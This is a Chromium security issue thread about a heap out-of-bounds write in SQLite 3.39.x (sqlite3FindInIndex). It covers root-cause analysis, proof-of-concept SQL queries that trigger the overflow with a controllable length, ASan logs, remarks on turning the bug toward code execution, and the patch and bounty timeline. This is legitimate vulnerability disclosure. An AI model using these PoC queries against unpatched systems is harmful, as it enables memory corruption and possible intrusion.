# Security: OOB Write in sqlite3FindInIndex

| Field | Value |
|-------|-------|
| **Issue ID** | [40060728](https://issues.chromium.org/issues/40060728) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Storage |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, iOS, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | as...@chromium.org |
| **Created** | 2022-08-31 |
| **Bounty** | $7,000.00 |

## Description

**VULNERABILITY DETAILS**

# root cause

[0] In the CodeEqualityTerm function, the program allocates a heap block of size nEq for aiMap, then calls the sqlite3FindInIndex function and pass the aiMap to it.

```
else{  
  aiMap = (int\*)sqlite3DbMallocZero(pParse->db, sizeof(int)\*nEq);  
  eType = sqlite3FindInIndex(pParse, pX, IN_INDEX_LOOP, 0, aiMap, &iTab);  
}  
pX = pExpr;  

```

[1] In the sqlite3FIndInIndex function, the program writes the data into aiMap and returns it. But the size of the written data is determined by pX->pLeft, which is diferrent from the previous nEq, it can easily be larger than nEq and cause oob-write.

```
if( aiMap && eType!=IN_INDEX_INDEX_ASC && eType!=IN_INDEX_INDEX_DESC ){  
    int i, n;  
    n = sqlite3ExprVectorSize(pX->pLeft);  
    for(i=0; i<n; i++) {  
      aiMap[i] = i;  
    }  
  }  

```
# exploitable

poc：

```
CREATE TABLE t0 ( c0 COLLATE RTRIM, c1, c2, c3, c4, c5, UNIQUE (c0, c0 COLLATE BINARY));  
SELECT \* FROM( t0 NATURAL JOIN t0 ) WHERE (1, 1, 1, 1, 1, c0) IN t0;  

```

The length of the overflow data can be easily controlled by changing the size of the vector, such as:

```
CREATE TABLE t0 ( c0 COLLATE RTRIM, c1, c2, c3, c4, c5, UNIQUE (c0, c0 COLLATE BINARY));  
SELECT \* FROM( t0 NATURAL JOIN t0 ) WHERE (1, 1, 1, 1, 1, c0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1) IN (SELECT 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 );  

```

LOG:

```
[LOG nEq]: 1 // ===> alloc size: nEq = 1  
[LOG n]: 18 // ===> data length: n = 18  
[LOG i]: 0  
[LOG i]: 1  
[LOG i]: 2  
=================================================================  
==3185653==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000a00 at pc 0x5555557f8afc bp 0x7fffffff9ef0 sp 0x7fffffff9ee0  
WRITE of size 4 at 0x602000000a00 thread T0  
......  

```

Continue to add:

```
CREATE TABLE t0 ( c0 COLLATE RTRIM, c1, c2, c3, c4, c5, UNIQUE (c0, c0 COLLATE BINARY));  
SELECT \* FROM( t0 NATURAL JOIN t0 ) WHERE (1, 1, 1, 1, 1, c0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1) IN (SELECT 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1);  

```

LOG:

```
[LOG nEq]: 1  // ===> alloc size: nEq = 1  
[LOG n]: 30  // ===> data length: n = 30  
[LOG i]: 0  
[LOG i]: 1  
[LOG i]: 2  
=================================================================  
==3185788==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000cc0 at pc 0x5555557f8afc bp 0x7fffffff9ef0 sp 0x7fffffff9ee0  
WRITE of size 4 at 0x602000000cc0 thread T0  

```

Since this vulnerability allows the attacker to control the length of the overflowed data easily, this vulnerability is likely to cause rce.

For example, if you could use a struct like this:

```
struct {  
		int size;  
		char buffer;  
};  

```

Attackers can modify the size by overflow, thus constituting arbitrary offset read and write.

# Other

This vulnerability affects sqlite3.39.0-3.39.3.  

Chrome stable 105 starts using sqlite 3.39.2, so is affected by this vulnerability.

Our fuzz hit the bug before the sqlite mainline was aware of the problem, but the sqlite mainline was aware of the problem when we writing the exploit, and they released a patch for the sqlite mainline. :(

But, The patch for this vulnerability has not been released to any sqlite release for over 20 days, so this is still a security issue that needs to be fixed as soon as possible, as it has made its way to chrome 105 after this chrome stable update.

Since this vulnerability can overflow write to any length, the vulnerability can be easily exploited by finding a suitable structure, so it has high exploitability and can be triggered remotely without interaction.  

Although its write content is not completely controllable, it is not easy to cause crashes and is likely to be exploited on memory chunks such as jemalloc or partitonalloc that do not have an alloc meta head (such as prev\_size, size).

Here I attach the mainline patch link of sqlite, you can also contact the author of sqlite to release a new release to merge patch for this problem.

<https://www.sqlite.org/src/info/003e4eee6b53a4de>  

<https://www.sqlite.org/src/info/0d0c31117a530356>

**VERSION**  

Chrome Version: [105.0.5195.52 - now] + [stable, beta, and dev]  

Operating System: ALL

**REPRODUCTION CASE**

1. Download Chromium with asan from <https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/linux-release%2Fasan-linux-release-1040186.zip?generation=1661691896532624&alt=media>
2. python3 -m http.server 8000
3. Run:`/path/to/asan-linux-release-1040186/chrome-wrapper --user-data-dir=./userdata http://127.0.0.1:8000/poc.html`
4. click trigger

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: see asan log

**CREDIT INFORMATION**  

Reporter credit:  

Ziling Chen and Nan Wang(@eternalsakura13) of 360 Vulnerability Research Institute

## Attachments

- [asan.txt](attachments/asan.txt) (text/plain, 20.4 KB)
- [poc.html](attachments/poc.html) (text/plain, 2.4 KB)
- [repro.mp4](attachments/repro.mp4) (video/mp4, 2.3 MB)
- [repro1.mp4](attachments/repro1.mp4) (video/mp4, 234.0 KB)

## Timeline

### [Deleted User] (2022-08-31)

[Empty comment from Monorail migration]

### bo...@chromium.org (2022-08-31)

Thanks for the report! 

Confirming repro on Linux @ 105/stable. The POC also crashes the renderer on Windows, but did not repro the ASAN crash as-is. I'll assume this is a quirk of exploitation rather than that Windows is not affected. 

[Monorail components: Internals>Storage]

### [Deleted User] (2022-08-31)

[Empty comment from Monorail migration]

### bo...@chromium.org (2022-08-31)

@asully & sqlite DEPS owners,
I defer to you whether the next step bump the DEPS entry to point at a more recent commit in the mirrored upstream repo or chase upstream to cut a new release. 

### as...@chromium.org (2022-08-31)

SQLite folks: are you close to releasing 3.39.3 or should we just roll to the current trunk?

### ad...@google.com (2022-08-31)

[Empty comment from Monorail migration]

### se...@gmail.com (2022-08-31)

re https://crbug.com/chromium/1358381#c5:
The patch for this bug is actually after the sqlite timeline bump to 3.39.3, so maybe we need 3.39.4 :)


### as...@chromium.org (2022-08-31)

I'm not seeing a 3.39.3 release. Is there something I'm missing?... https://www.sqlite.org/changes.html

### se...@gmail.com (2022-08-31)

https://www.sqlite.org/src/timeline
sorry, I mean in here, search 3.39.3, but patch is just behind it...

### se...@gmail.com (2022-08-31)

Although there really isn't any official release package released, I may have some misunderstandings. Sorry :)


### se...@gmail.com (2022-08-31)

We really should need 3.39.3


### dr...@gmail.com (2022-09-01)

SQLite version 3.39.3 will probably be published within the next 48 hours.  Maybe sooner.

This particular problem was injected with the addition of support for RIGHT and FULL JOIN in SQLite version 3.39.0.  A fix for the problem was first checked in at https://sqlite.org/src/timeline?c=b184c8d9222da6b4.  You are correct that this fix is both on the 3.39.3 branch and on trunk, but it has not appear in any official release as of yet.  It will be in 3.39.3.

### as...@chromium.org (2022-09-01)

Thank you for the update! I'll check for a new release before the weekend

### as...@chromium.org (2022-09-01)

[Empty comment from Monorail migration]

### dr...@gmail.com (2022-09-02)

It is looking like 3.39.3 will be pushed back until Monday.

### as...@chromium.org (2022-09-02)

[Empty comment from Monorail migration]

### dr...@gmail.com (2022-09-05)

SQLite version 3.39.3 has been tagged at https://sqlite.org/src/info/4635f4a69c8c2a8d and mirrored at https://github.com/sqlite/sqlite/commit/230ad4565e06fded73abdea46e12d358806397e8

### as...@chromium.org (2022-09-06)

Thanks you! Starting the roll process now

### gi...@appspot.gserviceaccount.com (2022-09-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/8de4cd375810b946b7d47350b768f6d11f63b0c0

commit 8de4cd375810b946b7d47350b768f6d11f63b0c0
Author: Austin Sullivan <asully@chromium.org>
Date: Wed Sep 07 02:22:49 2022

sqlite: Upgrade to 3.39.3 + Win build fix

Roll src/third_party/sqlite/src/ e6b634219..5fb64c1a1 (17 commits)

https://chromium.googlesource.com/chromium/deps/sqlite.git/+log/e6b634219416..5fb64c1a111a

$ git log e6b634219..5fb64c1a1 --date=short --no-merges --format='%ad %ae %s'
2022-09-06 asully sqlite: Cherry-pick to post-3.39.3
2022-09-06 asully Amalgamations for release 3.39.3
2022-09-05  Version 3.39.3
2022-09-02 Dan Kennedy Ensure the Pager.journalOff variable is zeroed if an error occurs while writing the initial header to the journal file.
2022-09-02  Remove a NEVER() that is sometimes true.
2022-09-02  Fix an assert() associated with the dbsqlfuzz error at [8372468bb5d8922c].
2022-09-02  When an OOM occurs and sets the Parse.nErr value, also set the Parse.nErr value for all outer Parse objects. dbsqlfuzz d33f60aaa67733aa700cd69dacf8e0e23a327a29
2022-09-02  Mutex protect access to the sqlite3_test_directory and sqlite3_data_directory global variables.  See [forum:/forumpost/719a11e1314d1c70|forum thread 719a11e1314d1c70].
2022-09-01  Defer deleting a transient SELECT statement associated with a flattening of one arm of a compound SELECT until after the parse has completed.
2022-08-31  Do not attempt the OP_Count optimization on queries with HAVING clauses. This fixes a problem exposed by [2cf373b10c9bc4cb].
2022-08-30  Any function call can abort.  Take this into account when deciding if a DML statement needs a statement journal.  See [forum:/forumpost/9b9e4716c0d7bbd1|forum thread 9b9e4716c0d7bbd1] for more information.
2022-08-05  Avoid having fts3 read uninitialized values when processing deferred tokens.
2022-08-04  Fix a problem with the query optimizer for LIMIT/OFFSET queries when underlying query is a UNION ALL and both arms of the UNION ALL are subqueries with an ORDER BY clause.  This bug was reported at [forum:/forumpost/6b5e9188f0657616|forum post 6b5e9188f0657616].  The problem was introduced in 2015 (SQLite version 3.9.0) by check-in [4b631364354068af].  See also ticket [b65cb2c8d91f6685].
2022-08-03  Improvement on the previous check-in.
2022-08-03  For an IN operator used with a RIGHT JOIN, use the number of terms in the vector, not the number of equality terms, to size the column map. dbsqlfuzz 14cfdad6ca45e607163f54049ddf5065183dc657.
2022-08-01  Bump the version number up to 3.39.3.
2022-08-01  In the xUpdate method of the GeoPoly virtual table, make sure that the number of updated columns does not exceed the underlying implementation, even if the virtual table object records an excess number of column in the nAux field due to table constraints in the table definition. Fix for the problem reported by [forum:/forumpost/a096ab7d96bb057a|forum post a096ab7d96bb057a].

Created with:
  roll-dep src/third_party/sqlite/src

Bug: 1358381, 1360495
Change-Id: Ic4684ff161536f9817875078298f03802e20f417
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3877233
Reviewed-by: Evan Stade <estade@chromium.org>
Auto-Submit: Austin Sullivan <asully@chromium.org>
Commit-Queue: Evan Stade <estade@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1043782}

[modify] https://crrev.com/8de4cd375810b946b7d47350b768f6d11f63b0c0/third_party/sqlite/README.chromium
[modify] https://crrev.com/8de4cd375810b946b7d47350b768f6d11f63b0c0/DEPS


### [Deleted User] (2022-09-07)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### as...@chromium.org (2022-09-07)

Fixed on main

### [Deleted User] (2022-09-07)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-07)

Requesting merge to stable M105 because latest trunk commit (1043782) appears to be after stable branch point (1027018).

Requesting merge to beta M106 because latest trunk commit (1043782) appears to be after beta branch point (1036826).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-09-07)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), harrysouders (iOS), ceb (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-09-07)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### as...@chromium.org (2022-09-07)

1. Why does your merge fit within the merge criteria for these milestones?

High-severity security bug

2. What changes specifically would you like to merge? Please link to Gerrit.

https://crrev.com/c/3877233

3. Have the changes been released and tested on canary?

No, the CL has not yet hit Canary

4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No

5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents

N/A

6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Yes, see the reproduction steps in the description

### am...@chromium.org (2022-09-08)

CL has not yet been on Canary for 24 hours, would like to get more bake time and re-evaulate tomorrow for a potential merge to stable/105 

### [Deleted User] (2022-09-08)

[Empty comment from Monorail migration]

### ha...@google.com (2022-09-08)

Note: iOS plans to cut it's M105 stable respin EOD tomorrow. If this needs to be go out in M105, we would need to merge tomorrow.

### as...@chromium.org (2022-09-08)

If we're not seeing any issues by tomorrow morning I think we should be okay to merge? I've tentatively created the CLs

M106: https://crrev.com/c/3885220
M105: https://crrev.com/c/3885582

### am...@chromium.org (2022-09-09)

Thanks for already creating the merge CLs, Austin. Merge approved for M106 and M105, please merge to branches 5249 and 5195 respectively asap so this fix can be included in today's stable respin cut. Thanks! 

### gi...@appspot.gserviceaccount.com (2022-09-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/7dd7bd250fcb94b24d76f1403ae6bb7043d52b34

commit 7dd7bd250fcb94b24d76f1403ae6bb7043d52b34
Author: Austin Sullivan <asully@chromium.org>
Date: Fri Sep 09 21:10:12 2022

[M105] sqlite: Upgrade to 3.39.3 + Win build fix

Roll src/third_party/sqlite/src/ e6b634219..5fb64c1a1 (17 commits)

https://chromium.googlesource.com/chromium/deps/sqlite.git/+log/e6b634219416..5fb64c1a111a

$ git log e6b634219..5fb64c1a1 --date=short --no-merges --format='%ad %ae %s'
2022-09-06 asully sqlite: Cherry-pick to post-3.39.3
2022-09-06 asully Amalgamations for release 3.39.3
2022-09-05  Version 3.39.3
2022-09-02 Dan Kennedy Ensure the Pager.journalOff variable is zeroed if an error occurs while writing the initial header to the journal file.
2022-09-02  Remove a NEVER() that is sometimes true.
2022-09-02  Fix an assert() associated with the dbsqlfuzz error at [8372468bb5d8922c].
2022-09-02  When an OOM occurs and sets the Parse.nErr value, also set the Parse.nErr value for all outer Parse objects. dbsqlfuzz d33f60aaa67733aa700cd69dacf8e0e23a327a29
2022-09-02  Mutex protect access to the sqlite3_test_directory and sqlite3_data_directory global variables.  See [forum:/forumpost/719a11e1314d1c70|forum thread 719a11e1314d1c70].
2022-09-01  Defer deleting a transient SELECT statement associated with a flattening of one arm of a compound SELECT until after the parse has completed.
2022-08-31  Do not attempt the OP_Count optimization on queries with HAVING clauses. This fixes a problem exposed by [2cf373b10c9bc4cb].
2022-08-30  Any function call can abort.  Take this into account when deciding if a DML statement needs a statement journal.  See [forum:/forumpost/9b9e4716c0d7bbd1|forum thread 9b9e4716c0d7bbd1] for more information.
2022-08-05  Avoid having fts3 read uninitialized values when processing deferred tokens.
2022-08-04  Fix a problem with the query optimizer for LIMIT/OFFSET queries when underlying query is a UNION ALL and both arms of the UNION ALL are subqueries with an ORDER BY clause.  This bug was reported at [forum:/forumpost/6b5e9188f0657616|forum post 6b5e9188f0657616].  The problem was introduced in 2015 (SQLite version 3.9.0) by check-in [4b631364354068af].  See also ticket [b65cb2c8d91f6685].
2022-08-03  Improvement on the previous check-in.
2022-08-03  For an IN operator used with a RIGHT JOIN, use the number of terms in the vector, not the number of equality terms, to size the column map. dbsqlfuzz 14cfdad6ca45e607163f54049ddf5065183dc657.
2022-08-01  Bump the version number up to 3.39.3.
2022-08-01  In the xUpdate method of the GeoPoly virtual table, make sure that the number of updated columns does not exceed the underlying implementation, even if the virtual table object records an excess number of column in the nAux field due to table constraints in the table definition. Fix for the problem reported by [forum:/forumpost/a096ab7d96bb057a|forum post a096ab7d96bb057a].

Created with:
  roll-dep src/third_party/sqlite/src

(cherry picked from commit 8de4cd375810b946b7d47350b768f6d11f63b0c0)

Bug: 1358381, 1360495
Change-Id: Ic4684ff161536f9817875078298f03802e20f417
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3877233
Reviewed-by: Evan Stade <estade@chromium.org>
Auto-Submit: Austin Sullivan <asully@chromium.org>
Commit-Queue: Evan Stade <estade@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1043782}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3885582
Cr-Commit-Position: refs/branch-heads/5195@{#1105}
Cr-Branched-From: 7aa3f074a7907975b001346cc0288d0214af8451-refs/heads/main@{#1027018}

[modify] https://crrev.com/7dd7bd250fcb94b24d76f1403ae6bb7043d52b34/third_party/sqlite/README.chromium
[modify] https://crrev.com/7dd7bd250fcb94b24d76f1403ae6bb7043d52b34/DEPS


### [Deleted User] (2022-09-09)

LTS Milestone M102

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sr...@google.com (2022-09-12)

Merge for M106 is approved, Please complete your merges asap so these changes can be included in this weeks beta release. Beta RC will be cut on Sept 13 (tuesday) at 3pm PST. 

Next week is M106 stable RC, so I would like to ensure all these CL's have good coverage before RC cut

If the merge is compelete and not linked to this bug, please drop the merge-approved-106 label 

### [Deleted User] (2022-09-12)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2022-09-12)

[Comment Deleted]

### am...@chromium.org (2022-09-12)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-09-12)

hi drhsqlite@ Looping back to https://crbug.com/chromium/1358381#c12, it *appears* this was a known issue in sqlite with a fix that was in progress when this report was submitted -- is that correct or no? 

It appears that we prioritized picking up v3.39.3 into Chromium due to this report, waiting for asully@ to confirm on that front. 

### gi...@appspot.gserviceaccount.com (2022-09-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/8753843f5d9f291649f90550dc5bf0ffe9bc23d8

commit 8753843f5d9f291649f90550dc5bf0ffe9bc23d8
Author: Austin Sullivan <asully@chromium.org>
Date: Mon Sep 12 20:39:30 2022

[M106] sqlite: Upgrade to 3.39.3 + Win build fix

Roll src/third_party/sqlite/src/ e6b634219..5fb64c1a1 (17 commits)

https://chromium.googlesource.com/chromium/deps/sqlite.git/+log/e6b634219416..5fb64c1a111a

$ git log e6b634219..5fb64c1a1 --date=short --no-merges --format='%ad %ae %s'
2022-09-06 asully sqlite: Cherry-pick to post-3.39.3
2022-09-06 asully Amalgamations for release 3.39.3
2022-09-05  Version 3.39.3
2022-09-02 Dan Kennedy Ensure the Pager.journalOff variable is zeroed if an error occurs while writing the initial header to the journal file.
2022-09-02  Remove a NEVER() that is sometimes true.
2022-09-02  Fix an assert() associated with the dbsqlfuzz error at [8372468bb5d8922c].
2022-09-02  When an OOM occurs and sets the Parse.nErr value, also set the Parse.nErr value for all outer Parse objects. dbsqlfuzz d33f60aaa67733aa700cd69dacf8e0e23a327a29
2022-09-02  Mutex protect access to the sqlite3_test_directory and sqlite3_data_directory global variables.  See [forum:/forumpost/719a11e1314d1c70|forum thread 719a11e1314d1c70].
2022-09-01  Defer deleting a transient SELECT statement associated with a flattening of one arm of a compound SELECT until after the parse has completed.
2022-08-31  Do not attempt the OP_Count optimization on queries with HAVING clauses. This fixes a problem exposed by [2cf373b10c9bc4cb].
2022-08-30  Any function call can abort.  Take this into account when deciding if a DML statement needs a statement journal.  See [forum:/forumpost/9b9e4716c0d7bbd1|forum thread 9b9e4716c0d7bbd1] for more information.
2022-08-05  Avoid having fts3 read uninitialized values when processing deferred tokens.
2022-08-04  Fix a problem with the query optimizer for LIMIT/OFFSET queries when underlying query is a UNION ALL and both arms of the UNION ALL are subqueries with an ORDER BY clause.  This bug was reported at [forum:/forumpost/6b5e9188f0657616|forum post 6b5e9188f0657616].  The problem was introduced in 2015 (SQLite version 3.9.0) by check-in [4b631364354068af].  See also ticket [b65cb2c8d91f6685].
2022-08-03  Improvement on the previous check-in.
2022-08-03  For an IN operator used with a RIGHT JOIN, use the number of terms in the vector, not the number of equality terms, to size the column map. dbsqlfuzz 14cfdad6ca45e607163f54049ddf5065183dc657.
2022-08-01  Bump the version number up to 3.39.3.
2022-08-01  In the xUpdate method of the GeoPoly virtual table, make sure that the number of updated columns does not exceed the underlying implementation, even if the virtual table object records an excess number of column in the nAux field due to table constraints in the table definition. Fix for the problem reported by [forum:/forumpost/a096ab7d96bb057a|forum post a096ab7d96bb057a].

Created with:
  roll-dep src/third_party/sqlite/src

(cherry picked from commit 8de4cd375810b946b7d47350b768f6d11f63b0c0)

Bug: 1358381, 1360495
Change-Id: Ic4684ff161536f9817875078298f03802e20f417
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3877233
Reviewed-by: Evan Stade <estade@chromium.org>
Auto-Submit: Austin Sullivan <asully@chromium.org>
Commit-Queue: Evan Stade <estade@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1043782}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3885220
Cr-Commit-Position: refs/branch-heads/5249@{#411}
Cr-Branched-From: 4f7bea5de862aaa52e6bde5920755a9ef9db120b-refs/heads/main@{#1036826}

[modify] https://crrev.com/8753843f5d9f291649f90550dc5bf0ffe9bc23d8/third_party/sqlite/README.chromium
[modify] https://crrev.com/8753843f5d9f291649f90550dc5bf0ffe9bc23d8/DEPS


### as...@chromium.org (2022-09-12)

[Comment Deleted]

### as...@chromium.org (2022-09-12)

RE https://crbug.com/chromium/1358381#c40: yes, that's correct

### dr...@gmail.com (2022-09-12)

https://crbug.com/chromium/1358381#c40 is correct.  The problem was found and fixed on trunk about a month before it was reported here.

### rz...@google.com (2022-09-13)

The condition "pExpr->iTable==0 || !ExprHasProperty(pExpr, EP_Subrtn) )" and its else clause (where the fix was applied) aren't present in M102

### am...@chromium.org (2022-09-13)

Thank you both re: https://crbug.com/chromium/1358381#c43 and https://crbug.com/chromium/1358381#c44, this issue does not appear to have a CVE granted upstream, so we'll go ahead and grant one here 

### am...@google.com (2022-09-13)

[Empty comment from Monorail migration]

### ha...@google.com (2022-09-13)

[Empty comment from Monorail migration]

### se...@gmail.com (2022-09-15)

Hello, can I get a bug bounty for this issue? : )

### es...@chromium.org (2022-09-15)

From https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules :

"""
Externally reported bugs are automatically considered for reward once they have been fixed, at which point you will see the "reward-topanel" label added to your bug, indicating it will soon appear at a reward panel meeting. The bug will be updated again once the panel has made a decision.
"""

### am...@google.com (2022-09-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-09-22)

Congratulations, Ziling Chen and Nan Wang! The VRP Panel has decided to award you $7,000 for this report. While this issue was known and patched upstream prior to your report, your report allowed prioritization of our pulling in an updated of sqlite into Chrome. Thank you for your efforts and reporting this issue to us. 

### am...@google.com (2022-09-23)

[Empty comment from Monorail migration]

### se...@gmail.com (2022-09-25)

re https://crbug.com/chromium/1358381#c52:
Hello, please let the finance team contact this email.
Ziling Chen needs to sign up for a new supplier account to receive this bug bounty, for bugs submitted through this email in the future, please pay to ziling chen's new account.
Thanks :)


### am...@chromium.org (2022-09-26)

Hello, rewards payment requests are sent to finance based on email address. Since this email address is not associated with an account enrolled in the payment systems, finance/p2p-vrp@ will be reaching out to Ziling Chen soon (if they have not already) to enroll them/this email address into the payment system so that VRP reward payments can be processed accordingly. 

### ad...@google.com (2022-09-26)

[Empty comment from Monorail migration]

### ad...@google.com (2022-09-26)

[Empty comment from Monorail migration]

### ad...@google.com (2022-09-26)

[Empty comment from Monorail migration]

### [Deleted User] (2022-12-14)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1358381?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocked-on: crbug.com/chromium/1360495]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40060728)*
